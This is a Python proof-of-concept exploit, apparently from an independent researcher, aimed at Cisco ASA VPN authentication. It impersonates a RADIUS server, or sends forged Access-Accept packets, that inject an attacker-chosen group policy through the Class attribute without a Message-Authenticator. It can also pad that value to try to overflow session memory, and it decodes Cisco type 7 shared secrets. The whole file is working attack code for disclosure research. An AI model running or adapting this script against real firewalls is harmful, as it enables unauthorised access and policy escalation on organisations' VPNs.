#!/usr/bin/env python3
"""
poc_radius_ou_inject.py — RADIUS Class Attribute Group Policy Injection PoC

Demonstrates F1: Cisco ASA accepts an Access-Accept with an attacker-controlled
OU= value in the Class attribute (attr 25) without requiring or validating
Message-Authenticator (attr 80, RFC 5080 §2.2).

Demonstrates F2: OU= extraction in LINA allows up to 256 bytes; CLI max is 64.
An oversized OU= value may overwrite adjacent session struct fields.

Usage (fake RADIUS server mode):
    python3 poc_radius_ou_inject.py --server --port 1812 --secret <shared_secret> \
        --policy <group_policy_name>

    The ASA must be configured with this host as its aaa-server.
    Authenticate a VPN session. The PoC responds to every Access-Request with
    an Access-Accept assigning <group_policy_name> via OU=.

Usage (single crafted packet mode):
    python3 poc_radius_ou_inject.py --send --host <asa_ip> --port 1812 \
        --secret <shared_secret> --request-auth <hex_16_bytes> \
        --req-id <0-255> --policy <group_policy_name>

Author: Independent security researcher
Affected product: Cisco Adaptive Security Appliance (ASA), all versions
No CVE assigned as of 2026-08-13.
"""

import hashlib
import socket
import struct
import argparse
import sys
import re


RADIUS_CODE_ACCESS_ACCEPT = 2


def cisco_type7_decode(enc):
    xlat = [0x64,0x73,0x66,0x64,0x3B,0x6B,0x66,0x38,
            0x38,0x6C,0x6B,0x38,0x53,0x6B,0x66,0x38]
    try:
        seed = int(enc[:2])
        enc = enc[2:]
        return "".join(chr(int(enc[i:i+2],16) ^ xlat[(seed+i//2)%16]) for i in range(0,len(enc),2))
    except Exception as e:
        sys.exit(f"Type 7 decode error: {e}")
ATTR_CLASS = 25
ATTR_MESSAGE_AUTHENTICATOR = 80  # intentionally NOT included — this is the finding


def build_class_attr(group_policy_name: str) -> bytes:
    value = f"OU={group_policy_name};".encode()
    length = 2 + len(value)
    return struct.pack("BB", ATTR_CLASS, length) + value


def compute_response_authenticator(code: int, pkt_id: int, attrs: bytes,
                                   request_auth: bytes, secret: str) -> bytes:
    length = 20 + len(attrs)
    data = (
        struct.pack("!BBH", code, pkt_id, length)
        + request_auth
        + attrs
        + secret.encode()
    )
    return hashlib.md5(data).digest()


def build_access_accept(pkt_id: int, request_auth: bytes, secret: str,
                        group_policy_name: str) -> bytes:
    attrs = build_class_attr(group_policy_name)
    # NOTE: no Message-Authenticator (attr 80) — demonstrating F1
    resp_auth = compute_response_authenticator(
        RADIUS_CODE_ACCESS_ACCEPT, pkt_id, attrs, request_auth, secret
    )
    length = 20 + len(attrs)
    header = struct.pack("!BBH", RADIUS_CODE_ACCESS_ACCEPT, pkt_id, length)
    return header + resp_auth + attrs


def parse_access_request(data: bytes):
    if len(data) < 20:
        return None, None, None
    code, pkt_id, length = struct.unpack("BBH", data[:4])
    authenticator = data[4:20]
    return code, pkt_id, authenticator


def run_server(port: int, secret: str, policy: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", port))
    print(f"[*] Listening on UDP :{port}")
    print(f"[*] Will respond with OU={policy}; (no Message-Authenticator)")
    print(f"[*] F2 OU= length: {len(policy)} chars "
          f"({'OVERFLOW RANGE' if len(policy) > 64 else 'normal range — use --f2 for overflow test'})")

    while True:
        data, addr = sock.recvfrom(4096)
        code, pkt_id, req_auth = parse_access_request(data)
        if code != 1:
            print(f"[!] Received non-Access-Request code={code} from {addr}, ignoring")
            continue

        print(f"[+] Access-Request from {addr} id={pkt_id}")
        pkt = build_access_accept(pkt_id, req_auth, secret, policy)
        sock.sendto(pkt, addr)
        ou_len = len(f"OU={policy};")
        print(f"[+] Sent Access-Accept — Class attr OU={policy}; "
              f"({ou_len} bytes, CLI max=64, extraction cap=256)")
        if ou_len > 64:
            print(f"[!] F2 TRIGGER: OU= value exceeds CLI max by {ou_len - 64} bytes")


def send_single(host: str, port: int, secret: str, req_auth_hex: str,
                req_id: int, policy: str):
    req_auth = bytes.fromhex(req_auth_hex)
    if len(req_auth) != 16:
        sys.exit("--request-auth must be exactly 16 bytes (32 hex chars)")
    pkt = build_access_accept(req_id, req_auth, secret, policy)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, (host, port))
    print(f"[+] Sent {len(pkt)}-byte Access-Accept to {host}:{port}")
    print(f"    Class attr: OU={policy}; ({len(policy)} chars)")
    print(f"    Message-Authenticator (attr 80): NOT PRESENT")
    print(f"    Response-Authenticator: {pkt[4:20].hex()}")


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--server", action="store_true",
                      help="Run as fake RADIUS server responding to any Access-Request")
    mode.add_argument("--send", action="store_true",
                      help="Send a single crafted Access-Accept")

    ap.add_argument("--port", type=int, default=1812)
    ap.add_argument("--secret", required=True,
                    help="RADIUS shared secret (plaintext or 'type7:<hash>' to auto-decode)")
    ap.add_argument("--policy", required=True,
                    help="Group policy name to inject via OU=. Use --f2 for overflow test.")
    ap.add_argument("--f2", action="store_true",
                    help="Pad policy name to 200 bytes (F2 overflow test; 256-byte extraction cap)")

    ap.add_argument("--host", help="[--send] Target ASA IP")
    ap.add_argument("--request-auth", dest="req_auth",
                    help="[--send] Request-Authenticator hex (32 chars)")
    ap.add_argument("--req-id", dest="req_id", type=int, default=1,
                    help="[--send] RADIUS packet ID (default 1)")

    args = ap.parse_args()

    secret = args.secret
    if secret.lower().startswith("type7:"):
        secret = cisco_type7_decode(secret[6:])
        print(f"[*] Type 7 decoded secret: {secret}")

    policy = args.policy
    if args.f2:
        policy = (args.policy + "A" * 200)[:200]
        print(f"[*] F2 mode: padding policy to {len(policy)} bytes "
              f"(extraction cap=256, CLI max=64)")

    if args.server:
        run_server(args.port, secret, policy)
    else:
        if not args.host or not args.req_auth:
            ap.error("--send requires --host and --request-auth")
        send_single(args.host, args.port, secret, args.req_auth,
                    args.req_id, policy)


if __name__ == "__main__":
    main()
